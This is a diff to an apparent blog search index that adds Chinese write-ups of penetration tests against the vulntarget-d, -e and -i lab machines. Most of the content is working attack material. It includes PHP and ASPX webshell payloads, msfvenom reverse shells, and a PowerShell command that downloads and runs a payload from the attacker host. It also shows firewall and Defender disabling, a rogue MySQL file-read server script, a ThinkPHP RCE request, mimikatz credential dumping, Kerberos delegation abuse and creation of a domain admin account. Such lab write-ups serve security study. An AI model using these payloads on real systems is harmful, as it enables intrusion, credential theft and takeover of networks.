@@ -350,6 +350,8 @@ from cryptography.hazmat.primitives import serialization, hashesfrom cryptograph
       </categories>
       <tags>
         <tag>vulntarget</tag>
+        <tag>勒索</tag>
+        <tag>应急响应</tag>
       </tags>
   </entry>
   <entry>
@@ -635,6 +637,8 @@ jad --source-only ShellServlet &gt; /tmp/ShellServlet.javavim /tmp/HttpServlet.j
       </categories>
       <tags>
         <tag>vulntarget</tag>
+        <tag>应急响应</tag>
+        <tag>内存马</tag>
       </tags>
   </entry>
   <entry>
@@ -1556,6 +1560,1134 @@ Metasploit框架包含一个模块（web_delivery），该模块可以生成并�
       </categories>
       <tags>
         <tag>权限维持</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-d</title>
+    <url>/2022/12/06/vulntarget-d/</url>
+    <content><![CDATA[
+机器密码
+ubuntu：eval&#x2F;vulntarget
+win7: crow&#x2F;admin
+拓扑
+
+
+信息收集扫描一下存活主机与端口，发现开放了80、81、888、3306、8888端口，有宝塔的服务
+
+访问80端口也能看出是个宝塔页面的提示
+
+81端口是个骑士cms，从底部可以看出其版本是74cms v6.0.20，是个开源的项目并且存在已知漏洞
+
+搜索一下可以发现应该是存在文件包含的漏洞
+
+漏洞利用首先POST提交payload将一句话写入到日志
+/index.php?m=home&amp;a=assign_resume_tplPOST：variable=1&amp;tpl=&lt;?php fputs(fopen(&quot;tx.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[x]);?&gt;&quot;)?&gt;; ob_flush();?&gt;/r/n&lt;qscms/company_show 列表名=&quot;info&quot; 企业id=&quot;$_GET[&#x27;id&#x27;]&quot;/&gt;
+
+
+然后POST提交文件包含日志生成webshell文件
+variable=1&amp;tpl=data/Runtime/Logs/Home/22_12_05.log
+
+
+接着就可以用蚁剑成功连接
+
+Ubuntu提权msf生成shell
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.150.128 LPORT=4444 -f elf &gt; test.elf
+
+通过蚁剑上传并运行
+chmod 777 shell1.elf./test.elf
+
+然后kali开启msf并上线
+use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lhost 192.168.150.128run
+
+反弹shell
+python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+在桌面文件中存在一个flag：flag{welcome_to_vulntarget-d}
+
+接着可以通过cve-2021-4034提权到root权限，先本地将其编译好再通过蚁剑上传后运行
+
+内网渗透可以得知内网段是205
+
+上传fscan进行扫描
+
+接着设置代理
+# 添加路由run autoroute -s 192.168.205.0/24run autoroute -p
+
+
+# 开启代理use auxiliary/server/socks_proxyset srvhost 192.168.150.128set version 4arun
+
+
+发现存活主机：192.168.205.133
+use auxiliary/scanner/discovery/udp_sweepset rhosts 192.168.205.100-200run
+
+
+扫描一些常见端口，可以发现开放了80、139、445、3306
+use auxiliary/scanner/portscan/tcpset rhosts 192.168.205.133set ports 22,23,80,139,445,1433,3306,3389,8080run
+
+
+或者通过frp建立代理（设置的端口不能小于3000还是多少的，现在不开了
+./frps -c ./frps.ini
+
+
+./frpc -c ./frpc.ini &amp;
+
+
+访问80发现就一个hello world没啥用
+
+接着扫一下目录发现phpinfo.php、l.php和phpmyadmin
+
+
+然后phpmyadmin存在弱口令root&#x2F;root
+
+这里可以发现secure_file_priv为NULL，所以我们就不能直接写文件getshell
+
+接着尝试写日志getshell
+# 查询general_log配置show global variables like &quot;%genera%&quot;;# 开启日志set global general_log=on;# 修改日志文件名称和存放位置：set global general_log_file=&#x27;C:/phpstudy/PHPTutorial/www/shell.php&#x27;;# 写入一句话select &#x27;&lt;?php @eval($_POST[a]);?&gt;&#x27;
+
+
+蚁剑成功连接
+
+进入后进行信息收集，不存在域也不存在下一层内网，打了四个补丁
+
+接着检查进程是否有杀软，发现存在火绒
+tasklist /svc
+
+
+所以接下来需要做一个免杀马
+
+https://github.com/crow821/crowsec/tree/master/BypassAV_360_huornog
+
+通过蚁剑上传jpg、bin文件和加载器
+# 生成shellcodemsfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 7 -b &#x27;\x00&#x27; lport=4444 -f raw -o crowsec.jpg
+
+启动cs，生成payload.bin
+
+msf设置正向连接，蚁剑运行crowsec_shelllcodeBypass.exe成功上线
+use exploit/multi/handlerset payload windows/meterpreter/bind_tcpset lhost 192.168.150.128run
+
+然后可以直接getsystem得到system权限
+
+在桌面找到flag：flag{happy_new_year_vulntarget-d}
+
+后面猕猴桃抓密码没结果
+
+解决办法：
+查看一下进程，找到crowsec_shelllcodeBypass.exe，将进程迁移到x64位上去（要迁移到system的user上），然后再次执行命令，即可获取明文密码（忘了截图也懒得再去弄一个
+getpidpsmigrate &lt;pid&gt;]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>vulntarget</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-e</title>
+    <url>/2022/12/09/vulntarget-e/</url>
+    <content><![CDATA[
+虚拟机网络配置：
+
+拓扑图：
+
+
+信息搜集扫描存活主机和端口
+
+这里外网win2016靶机有开防火墙，所以需要加个-d参数绕过防火墙进行端口扫描，但是这里扫的时候出了点问题，不过多试几次也能扫出来开放了5985端口(WinRM服务)和49773端口
+
+后面发现这样来扫会更快
+nmap -sC -sV -p- 192.168.150.137 -n -vv --min-rate=2000
+
+
+其中49773端口不知道是开着什么服务
+
+扫目录也没发现啥有用信息
+
+接着利用指纹识别工具**observer_ward**扫一下发现是向日葵服务（第一次使用的话使用-u 参数从指纹库中更新指纹
+
+漏洞利用可以利用前段时间爆出来的向日葵远程rce漏洞，通过工具**sunRce**进行命令执行
+
+查看防火墙状态发现是打开的，于是通过命令执行将其关闭
+./sunRce -h 192.168.150.137 -p 49773 -c &quot;netsh advfirewall show allprofile state&quot; -t rce./sunRce -h 192.168.150.137 -p 49773 -c &quot;netsh advfirewall set allprofiles state off&quot; -t rce
+
+
+再执行命令tasklist &#x2F;svc发现开着Defender，并命令执行将其关闭，但是它实时保护还是开着，上传的木马还是会被df杀掉
+./sunRce -h 192.168.150.137 -p 49773 -c &quot;tasklist /svc&quot; -t rce./sunRce -h 192.168.150.137 -p 49773 -c &quot;set-MpPreference -DisableRealtimeMonitoring $true&quot; -t rce
+
+
+所以我们可以制作免杀马或者通过powershell的这条语句执行策略绕过
+./sunRce -h 192.168.150.137 -p 49773 -c &quot;powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath \&quot;C:\Users\Administrator\&quot;&quot; -t rce
+
+
+msf生成木马并开启web服务
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.150.128 lport=4444 -f exe &gt; test.exepython -m http.server 80
+
+下载文件并执行
+./sunRce -h 192.168.150.137 -p 49773 -c &quot;powershell(new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.150.128/test.exe&#x27;,&#x27;C:\Users\Administrator\test.exe&#x27;)&quot; -t rce./sunRce -h 192.168.150.137 -p 49773 -c &quot;cd C:\Users\Administrator;dir&quot; -t rce./sunRce -h 192.168.150.137 -p 49773 -c &quot;start C:\Users\Administrator\test.exe&quot; -t rce
+
+
+msf成功上线
+use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.150.128run
+
+
+进入后信息收集一波
+
+在桌面发现需要测试的地址.txt
+
+
+然后这里猕猴桃抓密码还是没结果
+
+根据上次的经验，我们将进程迁移到x64位上去
+
+再执行一下即可获取到密码
+
+
+普通用户的话可以抓下来本地用mimikatz读取
+reg save hklm\sam sam.hivereg save hklm\system system.hive lsadump::sam /sam:sam.hive /system:system.hive
+
+也可以通过cs生成木马来实现上线
+
+
+信息收集
+
+
+利用hashdump或者猕猴桃抓取密码
+
+最后解码得到管理员和普通用户密码：administrator&#x2F;win2008；ash&#x2F;qweASD123
+
+
+在桌面找到文件需要测试的地址.txt
+
+portscan扫描发现192.168.100.131，存在22、80、3333、8888端口，可以知道用了宝塔
+
+内网渗透上传frp客户端建立代理
+
+./frps -c ./frps.ini
+
+
+frpc.exe -c ./frpc.ini &amp;
+
+
+通过msf查看浏览器的历史记录
+run post/windows/gather/forensics/browser_history
+
+
+用sqllite打开它，执行如下语句，可以发现几个有用的路径信息
+select url from moz_places
+
+
+但是访问都是报400
+
+这时候回想起前面我们dump下来的需要测试的地址.txt，猜测应该要host碰撞
+通过工具**hostscan**可以发现192.168.100.131对应的域名地址是www.cJO6w10YLS.com
+
+然后修改一下host头可以发现是thinkphp 5.0
+
+搜一下这个版本的漏洞看到有个5.X的rce
+
+https://www.freebuf.com/articles/web/289860.html
+
+尝试发现system会被宝塔拦截，不过eval没有被ban，可以用eval写马
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami
+
+
+phpinfo也会被拦，还可以通过file_put_contents写文件，但是当前的目录没有权限不可写，需要目录穿越到根目录下
+
+通过三次url编码的加密成功写入
+?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=../../1.php&amp;vars[1][1]=%3C?php%20eval(urldecode(urldecode(urldecode($_REQUEST[cmd]))));?%3E
+
+
+然后蚁剑连接时还需要编写一下蚁剑的编码规则以及host即可成功连接
+&#x27;use strict&#x27;;   // ##########    请在下方编写你自己的代码   ###################function forceEncode(s) &#123;  return Array.from(s).map(i=&gt;&#x27;%&#x27;+i.charCodeAt(0).toString(16).padStart(2,&#x27;0&#x27;)).join(&#x27;&#x27;)&#125; module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;  const payload = data[&#x27;_&#x27;]  data[pwd] = forceEncode(forceEncode(payload));  delete data[&#x27;_&#x27;];  console.log(data);  return data;&#125;
+
+
+
+
+连上后发现命令都是不可执行的，说明存在disable_function
+
+这里我们可以使用**php7-gc-bypass**绕过disable_function并执行系统命令
+
+信息收集发现还有个192.168.88.100的网卡
+
+在&#x2F;home&#x2F;vulntarget路径下发现了key文件，将其dump下来
+
+
+前面扫端口的时候就发现开放了ssh，所以尝试使用key连接ssh，最终尝试使用root成功登录
+
+关闭防火墙
+# 关闭防火墙ufw disable# 查看防火墙状态ufw status
+
+
+上传fscan扫一下内网，发现主机192.168.88.102开放了135、445、1433端口，存在SQL server服务
+
+通过工具hydra爆破smb得到账号密码：administrator&#x2F;admin@123
+hydra -L user.txt -P pass.txt 192.168.88.102 smb
+
+
+通过工具**wmiexec.py**远程执行成功上线
+
+信息搜集发现还有个10.0.10的网卡
+
+发现存在域vulntarget.com
+
+关闭防火墙
+netsh advfirewall set allprofiles state offnetsh advfirewall show allprofile state
+
+然后使用下面的命令打开3389端口
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+成功进入远程桌面
+
+约束性委派攻击上传mimikatz、ADFind、kekeo，探测win2008是否存在约束委派
+mimikatz获取密码：win2008&#x2F;qweASD123
+# 提升权限privilege::debug# 抓取密码sekurlsa::logonpasswords
+
+
+查找约束性委派主机，可以发现存在约束委派
+# 约束委派的查找# -u 任意用户，-up 密码，-b 域， -f 委派属性AdFind.exe -h 10.0.10.128 -u win2008 -up qweASD123  -b &quot;DC=nami,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto
+
+
+# 清除票据缓存mimikatz &quot;privilege::debug&quot; &quot;kerberos::purge&quot; &quot;exit&quot;
+
+已经知道服务用户明文的条件下，可以使用kekeo请求win2008的TGT
+# 请求该用户的TGT# /user: 服务用户的用户名# /password: 服务用户的明文密码# /domain: 所在域名# /ticket: 指定票据名称，不过这个参数没有生效，可以忽略tgt::ask /user:win2008 /domain:vulntarget.com /password:qweASD123 /ticket:ash.kirbi# 申请administrator权限的票据tgs::s4u /tgt:TGT_win2008@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/WIN-1PV25H8UJPN.vulntarget.com
+
+
+利用mimikatz导入S4U2proxy阶段生成的ST
+kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~WIN-1PV25H8UJPN.vulntarget.com@VULNTARGET.COM.kirbi
+
+
+dir访问域控
+dir \\WIN-1PV25H8UJPN.vulntarget.com\C$
+
+
+然后net user添加一个域用户，并加入到域管理员中
+net user admin123 admin@1234 /add /domainnet group &quot;domain admins&quot; admin123 /add /domain
+
+最后使用wmiexec远程执行成功上线
+
+后面维权可以看这篇文章
+
+https://mp.weixin.qq.com/s/EBA7iUUs0wJcODdY1iybLg
+
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>vulntarget</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-i</title>
+    <url>/2022/12/12/vulntarget-i/</url>
+    <content><![CDATA[
+机器密码：
+2008-1：
+administrator&#x2F;QwE123asd；vulntarget&#x2F;123.com
+后台：admin&#x2F;admin8888；数据库：root&#x2F;8B..123admin
+2008-2：
+administrator&#x2F;zxcvbnm；xiaoming&#x2F;Vme50..
+后台管理：admin&#x2F;8B..123admin (v7)；administrator&#x2F;8B..123admin (v6)
+2012：
+xiaopao&#x2F;CrazyThursday；administrator&#x2F;asdfghjkl
+数据库：管理员 sa&#x2F;QwE123asd；普通权限xiaopao&#x2F;123.com
+拓扑图：
+
+
+信息收集扫描存活主机和端口，发现开放了80、135、139、445、3306、5985、8000、47001等端口
+
+访问web显示是IIS7，没有什么有用信息
+
+访问8000端口显示是米拓信息，搜索可知是个企业建站系统
+
+扫目录发现存在adminer4.4.0，搜索漏洞可以发现有个任意文件读取漏洞
+
+漏洞利用
+https://github.com/ev0A/Mysqlist
+
+字典脚本如下：
+# -*- coding: utf-8 -*-import socketimport osimport sys #--------------------------------------------------------------------------------------------------------------------port = int(sys.argv[1])#-------------------------------------------------------------------------------------------------------------------- def mysql_get_file_content(sv, filename):    conn, address = sv.accept()    logpath = os.path.abspath(&#x27;.&#x27;) + &quot;/log/&quot; + address[0]    if not os.path.exists(logpath):        os.makedirs(logpath)     conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)    conn.recv(9999)     conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)    conn.recv(9999)     wantfile = chr(len(filename) + 1) + &quot;\x00\x00\x01\xFB&quot; + filename    conn.sendall(wantfile)    content = conn.recv(9999)    conn.close()     if len(content) &gt; 4:        with open(logpath + &quot;/&quot; + filename.replace(&quot;/&quot;, &quot;_&quot;).replace(&quot;:&quot;, &quot;_&quot;), &quot;w&quot;) as txt:            txt.write(content)        return True    else:        return False # 开始监听sv = socket.socket()sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)sv.bind((&quot;&quot;, port))sv.listen(5)print &quot;Listen Begin in port &quot;+str(port)# 日志文件夹  # 循环监听while True:    filename = raw_input(&quot;请输入接下来你想读的文件名 (直接按回车退出): &quot;)    if filename == &quot;&quot;:        break    res = mysql_get_file_content(sv, filename)    if res:        print &quot;Read Success! ---&gt; &quot;+filename    else:        print &quot;Not Found~ ---&gt; &quot;+filename
+
+运行脚本，直接输入想要读取的文件绝对路径adminer.php，然后adminer页面输入攻击机kali的IP，用户名密码数据库可以随便输一个，点击登录
+
+这里可以看到我们读取成功的文件会被记录到log文件夹中
+
+读取mysql的配置文件，根据报错信息发现是phpstudy
+
+然后我们可以探测一下phpstudy的默认路径/phpstudy_pro/www发现并不是默认的路径，下载源码进行分析发现是在config下的，但是需要绝对路径，再到IIS的看看发现有安全狗
+
+
+IIS有两个默认的读取绝对路径的方法
+C:\Windows\System32\inetsrv\MetaBase.xmlC:\Windows\System32\inetsrv\config\applicationHost.config
+这里读取的时候会发现上面的脚本不太行了，读取到的文件不完整，又换了个还是不完整
+
+
+只能修改代码读取完整的大文件，用while循环读取文件，修改如下：
+# -*- coding: utf-8 -*-import socketimport osimport sys #--------------------------------------------------------------------------------------------------------------------port = int(sys.argv[1])#-------------------------------------------------------------------------------------------------------------------- def mysql_get_file_content(sv, filename):    conn, address = sv.accept()    logpath = os.path.abspath(&#x27;.&#x27;) + &quot;/log/&quot; + address[0]    if not os.path.exists(logpath):        os.makedirs(logpath)     conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)    conn.recv(99999999)     conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)    conn.recv(99999999)     wantfile = chr(len(filename) + 1) + &quot;\x00\x00\x01\xFB&quot; + filename    conn.sendall(wantfile)    conn.sendall(&#x27;asdfsadfsadfsa&#x27;)    content = &#x27;asdfasdf&#x27;  # 初始进入循环        if len(content) &gt; 4:        with open(logpath + &quot;/&quot; + filename.replace(&quot;/&quot;, &quot;_&quot;).replace(&quot;:&quot;, &quot;_&quot;), &quot;w&quot;) as txt:            while len(content) !=0:                content = conn.recv(99999999)                txt.write(content)        return True    else:        return False    # if len(content) &gt; 4:    #     with open(logpath + &quot;/&quot; + filename.replace(&quot;/&quot;, &quot;_&quot;).replace(&quot;:&quot;, &quot;_&quot;), &quot;w&quot;) as txt:    #         txt.write(content)    #     return True    # else:    #     return False sv = socket.socket()sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)sv.bind((&quot;&quot;, port))sv.listen(5)print &quot;Listen Begin in port &quot;+str(port)  while True:    filename = raw_input(&quot;请输入接下来你想读的文件名 (直接按回车退出): &quot;)    if filename == &quot;&quot;:        break    res = mysql_get_file_content(sv, filename)    if res:        print &quot;Read Success! ---&gt; &quot;+filename    else:        print &quot;Not Found~ ---&gt; &quot;+filename
+
+可以得到IIS的网站的绝对路径以及安全狗的绝对路径
+C:\vulnIIS\俱乐部C:\Program Files (x86)\SafeDog\SafeDogSiteIIS\
+
+
+
+后来探测中发现不用跟绝对路径也是能成功读取的，于是使用相对路径读取config_db.php配置文件，从而得到数据库账号密码：root&#x2F;8B..123admin
+
+成功登录数据库
+
+进入后尝试通过日志getshell，首先查看secure_file_priv参数，发现为空有可读可写的权限
+# 查看secure_file_priv参数信息是否为空show global variables like &#x27;%secure%&#x27;
+
+
+查看配置信息发现general log是关了的，需要开启general log模式
+show variables like &#x27;%general%&#x27;;set global general_log=on
+
+
+
+然后尝试能否写入，发现可以执行成功但是访问却报404
+select &#x27;test&#x27; into dumpfile &#x27;C:\\vulnIIS\\俱乐部\\test.txt&#x27;
+
+
+
+接着再执行一次命令显示文件已经存在，再回头看这里我们的路径存在中文，因此可以猜测这是编码问题所导致的
+
+先来查看一下mysql的默认表，可能编码的不同导致这个中文跟符号融合了输出在vulnIIS目录下
+show variables like &#x27;character%&#x27;
+
+
+# 指定数据库字符集还是失败set character_set_client=&#x27;gbk&#x27;;set character_set_connection=&#x27;gbk&#x27;;set character_set_database=&#x27;gbk&#x27;;set character_set_results=&#x27;gbk&#x27;;set character_set_server=&#x27;gbk&#x27;;select &#x27;test&#x27; into outfile &#x27;C:\\vulnIIS\\俱乐部\\1.txt&#x27;;
+
+这里使用插件FH-Charset将网页编码设置成GBK，可以发现成功写入
+
+
+接着我们通过创建表的方式写入来绕安全狗，先将冰蝎的aspx马转hex
+3c25402050616765204c616e67756167653d2243232220253e3c2540496d706f7274204e616d6573706163653d2253797374656d2e5265666c656374696f6e22253e3c2553657373696f6e2e41646428226b222c226534356533323966656235643932356222293b202f2ae8afa5e5af86e992a5e4b8bae8bf9ee68ea5e5af86e7a0813332e4bd8d6d6435e580bce79a84e5898d3136e4bd8defbc8ce9bb98e8aea4e8bf9ee68ea5e5af86e7a08172656265796f6e642a2f627974655b5d206b203d20456e636f64696e672e44656661756c742e47657442797465732853657373696f6e5b305d202b202222292c63203d20526571756573742e42696e6172795265616428526571756573742e436f6e74656e744c656e677468293b417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528225522292e457175616c732874686973293b253e0a
+
+然后再去创建一个表
+create table test(test1 blob);    # blob被视为二进制字符串
+
+
+写入内容
+insert into test values (convert(0x3c25402050616765204c616e67756167653d2243232220253e3c2540496d706f7274204e616d6573706163653d2253797374656d2e5265666c656374696f6e22253e3c2553657373696f6e2e41646428226b222c226534356533323966656235643932356222293b202f2ae8afa5e5af86e992a5e4b8bae8bf9ee68ea5e5af86e7a0813332e4bd8d6d6435e580bce79a84e5898d3136e4bd8defbc8ce9bb98e8aea4e8bf9ee68ea5e5af86e7a08172656265796f6e642a2f627974655b5d206b203d20456e636f64696e672e44656661756c742e47657442797465732853657373696f6e5b305d202b202222292c63203d20526571756573742e42696e6172795265616428526571756573742e436f6e74656e744c656e677468293b417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528225522292e457175616c732874686973293b253e0a,char));
+
+
+成功写入
+
+将其导入IIS网站目录下（这里还是得使用插件将其转为GBK
+select test1 from test into dumpfile &#x27;C:\\vulnIIS\\俱乐部\\1.aspx&#x27;;
+
+
+最后冰蝎成功连接
+
+信息收集一波，是个低权限的，还有个192.168.30.131的网卡，打了四个补丁
+
+
+土豆提权
+尝试烂土豆提权失败，换端口也是失败告终
+
+
+尝试多汁土豆提权失败
+
+尝试PipePotato失败
+
+后面使用msf再尝试一下烂土豆提权
+msf生成木马再通过冰蝎上传
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.150.128 lport=4444 -f exe &gt; msf.exe
+
+msf成功上线
+use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.150.128run
+
+列出tokens，当前shell用户只是一个普通的用户，权限低，也就意味着shell的访问级别低，所以令牌只有当前用户本身
+use incognitolist_tokens -u
+
+
+上传烂土豆并执行，可以看到已经有的system的令牌，然后模拟该令牌，成功提权
+execute -cH -f potato.exelist_tokens -uimpersonate_token &quot;NT AUTHORITY\SYSTEM&quot;
+
+
+提权后使用猕猴桃抓一下密码
+
+需要先将进程迁移到x64位上去
+
+再执行一下即可获取到密码：Administrator&#x2F;QwE123asd
+
+msf这边shell用的不方便，我们还可以通过cs插件进行烂土豆提权也能成功，这里就直接通过提权后的msf运行cs马上线
+
+首先关闭防火墙
+netsh advfirewall set allprofiles state offnetsh advfirewall show allprofile state
+
+
+然后使用下面的命令打开3389端口
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+成功登录远程桌面
+
+在普通用户vulntarget中的桌面文件发现搜狗浏览器，打开看看是否有什么保存的密码
+
+但是去设置中查看并没有
+
+然后尝试通过登录普通用户查找，根据前面hashdump的解密得到vulntarget用户的密码：123.com
+
+成功得到管理后台的账号密码administrator&#x2F;8B..123admin
+
+内网渗透上传frp建立代理
+./frps -c ./frps.ini
+
+
+frpc.exe -c ./frpc.ini &amp;
+
+
+再上传fscan扫一下内网，发现主机192.168.30.130开放了80、135、445、8000端口
+
+访问8000端口是空白的，只显示出一个logo
+
+根据前面搜狗中访问保存的后台可以知道路径是/SiteServer/pageLogin.cshtml
+
+然后尝试登录后台发现报错
+
+搜了下报错是数据库配置问题，但是靶机连数据库文件一直出问题，后面修复初始环境的快照结果就解决了，但是没过多久又不行了，没有连接到mssql服务器，于是直接把IP改成10.0.10的
+
+接着搜索SiteServer CMS 6.15.51漏洞发现可能存在sql注入漏洞**CVE-2021-42656**，不过没复现成功
+后面看wp说是可以利用模板下载漏洞getshell（前面有看到但是介绍里是说对5.0版本包含5.0以下通杀就没尝试
+首先写一个aspx马，再对其进行压缩，并上传至IIS的网站的目录下
+&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var a = Request.Form(&quot;abc&quot;);var b = &quot;un&quot;;var a2 = &quot;fe&quot;;var c2 = &quot;sa&quot;;function fun ()&#123;return a ;&#125;eval(fun(),b+c2+a2);%&gt;
+
+然后去**菜鸟教程**上在线编译C#程序，得到字符串：ZjYIub&#x2F;YxA2nuEGSiGmc+ZyLUMtltzqK7OLPFo1MTHw&#x3D;
+using System; using System.IO; using System.Security.Cryptography; using System.Text; namespace EncryptApplication &#123; class Encrypt     &#123; static void Main(string[] args)       &#123;         var _encryptKey = &quot;vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5&quot;;         var _decryptKey = &quot;vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5&quot;;        var _inputString = &quot;http://192.168.30.131/1.zip&quot;;    # 只需要修改此处的地址        var _outString = &quot;&quot;; var _noteMessage = &quot;&quot;;        byte[] iv = &#123; 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF &#125;;        try&#123;            var byKey = Encoding.UTF8.GetBytes(_encryptKey.Length &gt; 8 ? _encryptKey.Substring(0, 8) : _encryptKey);           var des = new DESCryptoServiceProvider();           var inputByteArray = Encoding.UTF8.GetBytes(_inputString);           var ms = new MemoryStream();           var cs = new CryptoStream(ms, des.CreateEncryptor(byKey, iv), CryptoStreamMode.Write);     cs.Write(inputByteArray, 0, inputByteArray.Length);         cs.FlushFinalBlock();          _outString = Convert.ToBase64String(ms.ToArray());          Console.WriteLine(&quot;DesEncrypt:&quot;); Console.WriteLine(_outString); &#125;      catch (Exception error) &#123; _noteMessage = error.Message; &#125;  &#125; &#125; &#125;
+
+
+我们对此字符串再进行一次混淆
+&quot;+&quot; =&gt; &quot;0add0&quot;&quot;=&quot; =&gt; &quot;0equals0&quot;&quot;&amp;&quot; =&gt; &quot;0and0&quot;&quot;?&quot; =&gt; &quot;0question0&quot;&quot;/&quot; =&gt; &quot;0slash0&quot; # ZjYIub0slash0YxA2nuEGSiGmc0add0ZyLUMtltzqK7OLPFo1MTHw0equals0
+
+访问如下url（downloadUrl后添加混淆后的字符串，directoryName后修改为压缩文件的名称
+http://192.168.30.130:8000/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&amp;userKeyPrefix=test&amp;downloadUrl=ZjYIub0slash0YxA2nuEGSiGmc0add0ZyLUMtltzqK7OLPFo1MTHw0equals0&amp;directoryName=1
+
+然后拿蚁剑或者菜刀去连接即可
+http://192.168.30.130:8000/SiteFiles/SiteTemplates/1/1.aspx 密码：abc
+
+但是这里我没有实现，跟着wp中的另一种方法再进行复现一下
+getshell首先在设置管理-上传设置处添加上传图片类型aspx并修改上传文件夹为SiteFiles/SiteTemplates
+
+然后在显示管理-内容管理处上传图片会显示重命名后的文件路径
+
+这回就上传成功了，通过蚁剑成功连接（这里回显的上传文件名是t_xxx，所以需要把t_去掉
+
+连上后进行信息收集，发现和之前的一样是个低权限的，还有个10.0.10.100的网卡，打了四个补丁，并且还不出网
+
+于是利用第一台主机做跳板机转发上线，点击Plvoting-Listener进行设置监听
+
+制作exe木马，上传靶机执行上线，然后就还是和前面一样使用烂土豆提权
+
+接着我们读取cms数据库配置文件得到数据库账号密码：xiaopao&#x2F;123.com
+
+查看IP发现不在本地上存在双网站库分离环境，设置代理连接数据库，解密得到账号密码sa&#x2F;QwE123asd
+
+文件落地启用OLE组件
+exec master.dbo.sp_configure &#x27;show advanced options&#x27;, 1RECONFIGUREexec master.dbo.sp_configure &#x27;Ole Automation Procedures&#x27;, 1RECONFIGURE
+
+把cs生成的马转hex
+import binasciifilename = &#x27;beacon.exe&#x27;with open(filename, &#x27;rb&#x27;) as f:    content = f.read()print(binascii.hexlify(content))
+
+再把hex放在OLE组件内并创建命令执行存储过程
+DECLARE @DATAVARBINARY(MAX)= 0x-hex        # 填入自己转的hex    DECLARE @filepath VARCHAR(MAX)=&#x27;C:\\Windows\\temp\\cs.exe&#x27;    DECLARE @ObjectToken INT    EXEC sp_OACreate &#x27;ADODB.Stream&#x27;, @ObjectToken OUTPUT    EXEC sp_OASetProperty @ObjectToken,&#x27;Type&#x27;,1    EXEC sp_OAMethod @ObjectToken,&#x27;Open&#x27;    EXEC sp_OAMethod @ObjectToken,&#x27;Write&#x27;,NULL, @DATA    EXEC sp_OAMethod @ObjectToken,&#x27;SaveToFile&#x27;,NULL, @filepath,2    EXEC sp_OAMethod @ObjectToken,&#x27;Close&#x27;    EXEC sp_OADestroy @ObjectToken    SELECT @filepath
+
+成功上线CS
+exec master..xp_cmdshell &quot;cmd /c C:\\Users\\Public\\Downloads\\n.exe&quot;]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>vulntarget</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-j</title>
